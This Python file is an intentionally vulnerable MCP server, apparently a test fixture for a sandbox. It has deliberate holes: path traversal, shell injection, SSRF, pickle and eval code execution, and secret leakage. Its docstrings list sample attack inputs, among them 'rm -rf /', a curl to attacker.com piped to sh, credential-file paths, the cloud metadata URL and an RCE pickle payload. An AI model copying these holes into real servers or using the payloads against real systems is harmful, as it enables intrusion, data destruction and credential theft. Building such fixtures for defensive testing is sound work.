#!/usr/bin/env python3
"""
Vulnerable MCP Server - Intentionally Insecure for Testing

This server implements real vulnerability patterns found in our audit of 501 MCP servers.
Each vulnerability is tagged with its MCP-Guard ID (e.g., MCP044 for shell injection).

WARNING: This server is intentionally vulnerable. DO NOT use in production.
It exists solely to test that MCP Jail properly blocks these attack vectors.

Vulnerability Categories Implemented:
- MCP012: Path Traversal (76.0% of servers)
- MCP013: Shell Execution (70.3% of servers)
- MCP017: SSRF/Unrestricted Network (75.4% of servers)
- MCP044: Command Injection (70.3% of servers)
- MCP007: Hardcoded Secrets Exposure (29.3% of servers)
"""

import json
import os
import subprocess
import sys
import urllib.request
import pickle
import base64

# MCP007: Hardcoded secrets (found in 29.3% of servers)
# These would be exposed in responses or logs
HARDCODED_SECRETS = {
    "OPENAI_API_KEY": "sk-proj-abc123def456ghi789jkl012mno345pqr678stu901vwx234",
    "AWS_SECRET_ACCESS_KEY": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
    "GITHUB_TOKEN": "ghp_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
    "DATABASE_PASSWORD": "SuperSecretP@ssw0rd!",
}


def log(msg):
    """Log to stderr (visible in test output)."""
    sys.stderr.write(f"[VULN-SERVER] {msg}\n")
    sys.stderr.flush()


def read_request():
    """Read a JSON-RPC request from stdin."""
    line = sys.stdin.readline()
    if not line:
        return None
    return json.loads(line.strip())


def write_response(response):
    """Write a JSON-RPC response to stdout."""
    print(json.dumps(response), flush=True)


def handle_initialize(request):
    """Handle initialize request."""
    return {
        "jsonrpc": "2.0",
        "id": request.get("id"),
        "result": {
            "protocolVersion": "2024-11-05",
            "capabilities": {"tools": {}},
            "serverInfo": {
                "name": "vulnerable-mcp-server",
                "version": "1.0.0",
                "description": "Intentionally vulnerable for security testing"
            }
        }
    }


def handle_tools_list(request):
    """Return list of tools - includes dangerous capabilities found in real MCP servers."""
    return {
        "jsonrpc": "2.0",
        "id": request.get("id"),
        "result": {
            "tools": [
                # MCP012: Path Traversal vulnerability
                {
                    "name": "read_file",
                    "description": "Read any file from the filesystem (NO PATH VALIDATION - MCP012)",
                    "inputSchema": {
                        "type": "object",
                        "properties": {
                            "path": {"type": "string", "description": "Path to the file"}
                        },
                        "required": ["path"]
                    }
                },
                # MCP012: Arbitrary file write
                {
                    "name": "write_file",
                    "description": "Write to any file (NO PATH VALIDATION - MCP012)",
                    "inputSchema": {
                        "type": "object",
                        "properties": {
                            "path": {"type": "string"},
                            "content": {"type": "string"}
                        },
                        "required": ["path", "content"]
                    }
                },
                # MCP044/MCP013: Command injection via shell=True
                {
                    "name": "execute_command",
                    "description": "Execute shell command (SHELL INJECTION - MCP044)",
                    "inputSchema": {
                        "type": "object",
                        "properties": {
                            "command": {"type": "string", "description": "Shell command to execute"}
                        },
                        "required": ["command"]
                    }
                },
                # MCP044: Command injection in file search
                {
                    "name": "search_files",
                    "description": "Search files using pattern (INJECTION VIA PATTERN - MCP044)",
                    "inputSchema": {
                        "type": "object",
                        "properties": {
                            "directory": {"type": "string"},
                            "pattern": {"type": "string"}
                        },
                        "required": ["directory", "pattern"]
                    }
                },
                # MCP017: SSRF vulnerability
                {
                    "name": "fetch_url",
                    "description": "Fetch content from URL (NO SSRF PROTECTION - MCP017)",
                    "inputSchema": {
                        "type": "object",
                        "properties": {
                            "url": {"type": "string", "description": "URL to fetch"}
                        },
                        "required": ["url"]
                    }
                },
                # MCP021: Insecure deserialization
                {
                    "name": "load_data",
                    "description": "Load serialized data (PICKLE RCE - MCP021)",
                    "inputSchema": {
                        "type": "object",
                        "properties": {
                            "data": {"type": "string", "description": "Base64-encoded pickle data"}
                        },
                        "required": ["data"]
                    }
                },
                # MCP041: Dynamic code execution
                {
                    "name": "evaluate",
                    "description": "Evaluate expression (EVAL RCE - MCP041)",
                    "inputSchema": {
                        "type": "object",
                        "properties": {
                            "expression": {"type": "string", "description": "Python expression to evaluate"}
                        },
                        "required": ["expression"]
                    }
                },
                # MCP007: Secrets exposure
                {
                    "name": "get_config",
                    "description": "Get configuration including secrets (LEAKS SECRETS - MCP007)",
                    "inputSchema": {
                        "type": "object",
                        "properties": {},
                        "required": []
                    }
                },
                # Safe tool for comparison
                {
                    "name": "ping",
                    "description": "Simple ping tool (safe)",
                    "inputSchema": {
                        "type": "object",
                        "properties": {},
                        "required": []
                    }
                }
            ]
        }
    }


def handle_tool_call(request):
    """Handle tool calls - implements real vulnerable patterns."""
    params = request.get("params", {})
    tool_name = params.get("name", "")
    arguments = params.get("arguments", {})

    log(f"Tool call: {tool_name} with args: {json.dumps(arguments)}")

    try:
        if tool_name == "read_file":
            return handle_read_file(request, arguments)
        elif tool_name == "write_file":
            return handle_write_file(request, arguments)
        elif tool_name == "execute_command":
            return handle_execute_command(request, arguments)
        elif tool_name == "search_files":
            return handle_search_files(request, arguments)
        elif tool_name == "fetch_url":
            return handle_fetch_url(request, arguments)
        elif tool_name == "load_data":
            return handle_load_data(request, arguments)
        elif tool_name == "evaluate":
            return handle_evaluate(request, arguments)
        elif tool_name == "get_config":
            return handle_get_config(request)
        elif tool_name == "ping":
            return handle_ping(request)
        else:
            return error_response(request, -32601, f"Unknown tool: {tool_name}")
    except Exception as e:
        log(f"Error in {tool_name}: {e}")
        return error_response(request, -32000, str(e))


# ============================================================================
# MCP012: Path Traversal Vulnerabilities
# Found in 76.0% of MCP servers (381 servers)
# ============================================================================

def handle_read_file(request, args):
    """
    VULNERABLE: No path validation - allows reading any file.

    Real-world example from audit:
        def read_file(filepath):
            with open(filepath, 'r') as f:
                return f.read()

    Attack vectors:
        - ../../etc/passwd
        - ../../.aws/credentials
        - ../../.ssh/id_rsa
        - ../../.env
    """
    path = args.get("path", "")
    log(f"[MCP012] Attempting to read: {path}")

    # VULNERABLE: No validation at all!
    try:
        with open(path, 'r') as f:
            content = f.read()
        log(f"[MCP012] Successfully read {len(content)} bytes from {path}")
        return success_response(request, f"Contents of {path}:\n{content}")
    except FileNotFoundError:
        return error_response(request, -32000, f"File not found: {path}")
    except PermissionError:
        return error_response(request, -32000, f"Permission denied: {path}")
    except Exception as e:
        return error_response(request, -32000, f"Error reading file: {e}")


def handle_write_file(request, args):
    """
    VULNERABLE: No path validation - allows writing to any file.

    Attack vectors:
        - Write to ~/.ssh/authorized_keys (SSH backdoor)
        - Write to ~/.bashrc (persistence)
        - Write to cron directories
    """
    path = args.get("path", "")
    content = args.get("content", "")
    log(f"[MCP012] Attempting to write to: {path}")

    # VULNERABLE: No validation!
    try:
        with open(path, 'w') as f:
            f.write(content)
        log(f"[MCP012] Successfully wrote {len(content)} bytes to {path}")
        return success_response(request, f"Wrote {len(content)} bytes to {path}")
    except Exception as e:
        return error_response(request, -32000, f"Error writing file: {e}")


# ============================================================================
# MCP044/MCP013: Command Injection / Shell Execution
# Found in 70.3% of MCP servers (352 servers)
# ============================================================================

def handle_execute_command(request, args):
    """
    VULNERABLE: Direct shell execution with user input.

    Real-world pattern from audit:
        os.system(f"grep {user_input} /var/log/app.log")

    Attack vectors:
        - ; rm -rf /
        - | cat /etc/passwd
        - && curl attacker.com/malware | sh
        - `whoami`
    """
    command = args.get("command", "")
    log(f"[MCP044] Executing command: {command}")

    # VULNERABLE: shell=True with user input!
    try:
        result = subprocess.run(
            command,
            shell=True,  # DANGEROUS!
            capture_output=True,
            text=True,
            timeout=10
        )
        output = result.stdout + result.stderr
        log(f"[MCP044] Command output: {output[:200]}...")
        return success_response(request, f"Command: {command}\nOutput:\n{output}")
    except subprocess.TimeoutExpired:
        return error_response(request, -32000, "Command timed out")
    except Exception as e:
        return error_response(request, -32000, f"Execution error: {e}")


def handle_search_files(request, args):
    """
    VULNERABLE: Shell injection via find command pattern.

    Real-world pattern from audit:
        subprocess.run(f"find {directory} -name '{pattern}'", shell=True)

    Attack vectors:
        - pattern: "'; cat /etc/passwd #"
        - directory: "/tmp; rm -rf / #"
    """
    directory = args.get("directory", ".")
    pattern = args.get("pattern", "*")
    log(f"[MCP044] Searching: find {directory} -name '{pattern}'")

    # VULNERABLE: User input in shell command!
    try:
        cmd = f"find {directory} -name '{pattern}' 2>/dev/null | head -20"
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
        return success_response(request, f"Search results:\n{result.stdout}")
    except Exception as e:
        return error_response(request, -32000, f"Search error: {e}")


# ============================================================================
# MCP017: SSRF (Server-Side Request Forgery)
# Found in 75.4% of MCP servers (378 servers)
# ============================================================================

def handle_fetch_url(request, args):
    """
    VULNERABLE: No URL validation - allows SSRF attacks.

    Real-world pattern from audit:
        response = requests.get(url)
        return response.text

    Attack vectors:
        - http://169.254.169.254/latest/meta-data/ (AWS credentials)
        - http://localhost:8080/admin (internal services)
        - file:///etc/passwd (local file read)
        - http://internal-db:5432 (port scanning)
    """
    url = args.get("url", "")
    log(f"[MCP017] Fetching URL: {url}")

    # VULNERABLE: No URL validation!
    try:
        with urllib.request.urlopen(url, timeout=10) as response:
            content = response.read().decode('utf-8', errors='ignore')
        log(f"[MCP017] Fetched {len(content)} bytes from {url}")
        return success_response(request, f"Content from {url}:\n{content[:2000]}")
    except Exception as e:
        return error_response(request, -32000, f"Fetch error: {e}")


# ============================================================================
# MCP021: Insecure Deserialization
# Found in 12 servers (all CRITICAL)
# ============================================================================

def handle_load_data(request, args):
    """
    VULNERABLE: Pickle deserialization with untrusted data.

    Real-world pattern from audit (AI/ML servers):
        return pickle.loads(data)

    Attack vector: Crafted pickle payload that executes arbitrary code.
    Example RCE pickle:
        import pickle, base64, os
        class Exploit:
            def __reduce__(self):
                return (os.system, ('id',))
        payload = base64.b64encode(pickle.dumps(Exploit()))
    """
    data = args.get("data", "")
    log(f"[MCP021] Loading pickled data: {data[:50]}...")

    # VULNERABLE: Pickle with untrusted data!
    try:
        decoded = base64.b64decode(data)
        obj = pickle.loads(decoded)  # RCE!
        return success_response(request, f"Loaded object: {obj}")
    except Exception as e:
        return error_response(request, -32000, f"Deserialization error: {e}")


# ============================================================================
# MCP041: Dynamic Code Execution
# Found in critical servers
# ============================================================================

def handle_evaluate(request, args):
    """
    VULNERABLE: eval() with user input.

    Real-world pattern from audit:
        return eval(expression)

    Attack vectors:
        - __import__('os').system('id')
        - open('/etc/passwd').read()
        - __import__('subprocess').check_output(['whoami'])
    """
    expression = args.get("expression", "")
    log(f"[MCP041] Evaluating: {expression}")

    # VULNERABLE: eval with user input!
    try:
        result = eval(expression)  # RCE!
        return success_response(request, f"Result: {result}")
    except Exception as e:
        return error_response(request, -32000, f"Eval error: {e}")


# ============================================================================
# MCP007: Hardcoded Secrets Exposure
# Found in 29.3% of MCP servers (147 servers)
# ============================================================================

def handle_get_config(request):
    """
    VULNERABLE: Exposes hardcoded secrets in responses.

    Real-world pattern from audit:
        class Config:
            API_KEY = "sk-..."

    This leaks API keys, database credentials, etc.
    """
    log("[MCP007] Returning config with hardcoded secrets")

    # VULNERABLE: Exposes secrets!
    return success_response(request, json.dumps({
        "config": HARDCODED_SECRETS,
        "environment": dict(os.environ)  # Also leaks env vars!
    }, indent=2))


# ============================================================================
# Safe tools for comparison
# ============================================================================

def handle_ping(request):
    """Safe tool - just returns pong."""
    return success_response(request, "pong")


# ============================================================================
# Helper functions
# ============================================================================

def success_response(request, text):
    """Create a successful MCP response."""
    return {
        "jsonrpc": "2.0",
        "id": request.get("id"),
        "result": {
            "content": [
                {"type": "text", "text": text}
            ]
        }
    }


def error_response(request, code, message):
    """Create an error MCP response."""
    return {
        "jsonrpc": "2.0",
        "id": request.get("id"),
        "error": {"code": code, "message": message}
    }


def main():
    """Main server loop."""
    log("Starting vulnerable MCP server (for security testing only!)")
    log("Implemented vulnerabilities: MCP007, MCP012, MCP013, MCP017, MCP021, MCP041, MCP044")

    while True:
        try:
            request = read_request()
            if request is None:
                break

            method = request.get("method", "")
            log(f"Received method: {method}")

            if method == "initialize":
                response = handle_initialize(request)
            elif method == "tools/list":
                response = handle_tools_list(request)
            elif method == "tools/call":
                response = handle_tool_call(request)
            elif method == "ping":
                response = {"jsonrpc": "2.0", "id": request.get("id"), "result": {}}
            else:
                response = error_response(request, -32601, f"Method not found: {method}")

            write_response(response)

        except json.JSONDecodeError as e:
            log(f"JSON parse error: {e}")
        except Exception as e:
            log(f"Server error: {e}")


if __name__ == "__main__":
    main()
